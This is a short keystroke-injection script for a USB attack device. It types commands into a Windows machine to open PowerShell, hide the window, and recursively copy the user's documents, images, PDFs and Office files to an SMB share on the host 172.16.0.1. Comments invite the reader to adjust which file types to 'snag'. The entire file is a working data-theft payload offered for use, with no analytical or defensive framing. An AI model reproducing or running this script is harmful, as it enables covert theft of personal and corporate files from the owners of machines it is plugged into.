extensions = ["png","txt","docx","pdf","docx","xml","pptx","ppt","xlsx","xls"] // modify the filetypes to snag

layout("US");
waitLED(ANY_OR_NONE, 5000);
typingSpeed(0,0);
press("GUI r");
delay(1000); // <------------------ Modify these to suit your needs.
type("powershell\n"); // I've made the script really fast.
delay(2000); // <------------------ You have been warned.

extensions = "*." + extensions.join(", *.")
type('$h=(gps -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios(1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)\n$i="172.16.0.1";while(1){if(Test-Connection $i -Cou 1){$d="\\\\$i\\e\\$($env:username)_$(date -F "hhmmMMddyyyy")";md $d;ls $env:userprofile -r -i ' + extensions + '|cp -Dest $d;New-Item -t f -p \\\\$i\\e\\done;exit;}}\n');
